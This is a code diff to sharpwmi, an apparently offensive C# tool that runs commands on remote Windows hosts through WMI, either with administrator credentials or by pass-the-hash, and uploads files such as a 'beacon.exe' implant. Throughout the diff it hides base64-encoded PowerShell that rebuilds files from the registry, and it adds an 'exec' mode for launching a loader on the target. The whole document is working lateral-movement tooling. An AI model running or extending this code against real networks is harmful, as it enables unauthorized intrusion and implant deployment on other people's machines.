@@ -12,18 +12,27 @@ namespace sharpwmi
         public ManagementScope scope;
 
 
-        public Int32 ExecCmd(string cmd)
+        public Boolean ExecCmd(string cmd)
         {
 
-            using (var managementClass = new ManagementClass(this.scope,new ManagementPath("Win32_Process"),new ObjectGetOptions()))
+            try
             {
-                var inputParams = managementClass.GetMethodParameters("Create");
+                using (var managementClass = new ManagementClass(this.scope, new ManagementPath("Win32_Process"), new ObjectGetOptions()))
+                {
+                    var inputParams = managementClass.GetMethodParameters("Create");
 
-                inputParams["CommandLine"] = cmd;
+                    inputParams["CommandLine"] = cmd;
 
-                var outParams = managementClass.InvokeMethod("Create", inputParams, new InvokeMethodOptions());
-                return 1;
+                    var outParams = managementClass.InvokeMethod("Create", inputParams, new InvokeMethodOptions());
+                    return true;
+                }
             }
+            catch (UnauthorizedAccessException e)
+            {
+                Console.WriteLine("Exception caught: {0}", e);
+                return false;
+            }
+
         }
 
         public static string Base64Encode(string content)
@@ -42,7 +51,7 @@ namespace sharpwmi
         {
             if (args.Length < 3)
             {
-                Console.WriteLine("\n\t\tsharpwmi.exe 192.168.2.3 administrator 123 cmd whoami\n\t\tsharpwmi.exe 192.168.2.3 administrator 123 upload beacon.exe c:\\beacon.exe\n\t\tsharpwmi.exe pth 192.168.2.3 cmd whoami\n\t\tsharpwmi.exe pth 192.168.2.3 upload beacon.exe c:\\beacon.exe");
+                Console.WriteLine("\n\t\tsharpwmi.exe 192.168.2.3 administrator 123 cmd whoami\n\t\tsharpwmi.exe 192.168.2.3 administrator 123 upload beacon.exe c:\\beacon.exe\n\t\t\n\t\tsharpwmi.exe 192.168.2.3 administrator 123 exec loader.exe\n\t\tsharpwmi.exe pth 192.168.2.3 cmd whoami\n\t\tsharpwmi.exe pth 192.168.2.3 upload beacon.exe c:\\beacon.exe\n\t\tsharpwmi.exe pth 192.168.2.3 exec loader.exe");
                 return;
             }
 
@@ -68,10 +77,22 @@ namespace sharpwmi
                 ConnectionOptions options = new ConnectionOptions();
 
                 int delay = 5000;
+
                 this.scope = new ManagementScope("\\\\" + host + "\\root\\cimv2", options);
                 this.scope.Options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
                 this.scope.Options.EnablePrivileges = true;
-                this.scope.Connect();
+                try
+                {
+                    this.scope.Connect();
+                }
+                catch (UnauthorizedAccessException e)
+                {
+                    Console.WriteLine("Exception caught: {0}", e);
+                    return;
+                }
+
+
+
 
                 if (func_name == "cmd") {
                     string powershell_command = "powershell -enc " + Base64Encode(command);
@@ -118,6 +139,12 @@ namespace sharpwmi
                     Console.WriteLine("[+]Upload file done!");
                     return;
                 }
+                else if (args[3] == "exec")
+                {
+                    string cmd = args[4];
+                    ExecCmd(cmd);
+                    Console.WriteLine("[+]Exec finish!\n");
+                }
 
             }
             else
@@ -130,10 +157,20 @@ namespace sharpwmi
 
 
                 int delay = 5000;
+
                 this.scope = new ManagementScope("\\\\" + host + "\\root\\cimv2", options);
                 this.scope.Options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
                 this.scope.Options.EnablePrivileges = true;
-                this.scope.Connect();
+                try
+                {
+                    this.scope.Connect();
+                }
+                catch (UnauthorizedAccessException e)
+                {
+                    Console.WriteLine("Exception caught: {0}", e);
+                    return;
+                }
+
 
 
                 if (args[3] == "cmd")
@@ -205,7 +242,7 @@ namespace sharpwmi
                     string pscode = Encoding.UTF8.GetString(Convert.FromBase64String("JHdtaT1bd21pY2xhc3NdIlJvb3RcZGVmYXVsdDpzdGRSZWdQcm92IjskZnRzZWdzPSgkd21pLkdldF" +
                         "N0cmluZ1ZhbHVlKDIxNDc0ODM2NTAsIiIsImZ0X3NlZ3MiKSkuc1ZhbHVlOyRmdHNpemU9KCR3bWkuR2V0U3RyaW5nVmFsdWUoMjE0NzQ4MzY1MCwiIiwiZnRfc2l6ZSIpKS5zVmFsd" +
                         "WU7JGZieXRlcz1OZXctT2JqZWN0IEJ5dGVbXSAwO2Zvcigkc2lkPTA7JHNpZC1sdCRmdHNlZ3M7JHNpZCsrKXskc2RhdGE9KCR3bWkuR2V0U3RyaW5nVmFsdWUoMjE0NzQ4MzY1MCwi" +
-                        "IiwiZnRfcCRzaWQiKSkuc1ZhbHVlOyRmYnl0ZXMrPVtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkc2RhdGEpO31baW8uZmlsZV06OldyaXRlQWxsQnl0ZXMoIg==")) 
+                        "IiwiZnRfcCRzaWQiKSkuc1ZhbHVlOyRmYnl0ZXMrPVtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkc2RhdGEpO31baW8uZmlsZV06OldyaXRlQWxsQnl0ZXMoIg=="))
                             + args[5] + Encoding.UTF8.GetString(Convert.FromBase64String("IiwkZmJ5dGVzKTs="));
                     string powershell_command = "powershell -enc " + Base64Encode(pscode);
 
@@ -215,6 +252,11 @@ namespace sharpwmi
                     Console.WriteLine("[+]Upload file done!");
                     return;
 
+                }
+                else if (args[3] == "exec") {
+                    string cmd = args[4];
+                    ExecCmd(cmd);
+                    Console.WriteLine("[+]Exec finish!\n");
                 }
             }
             
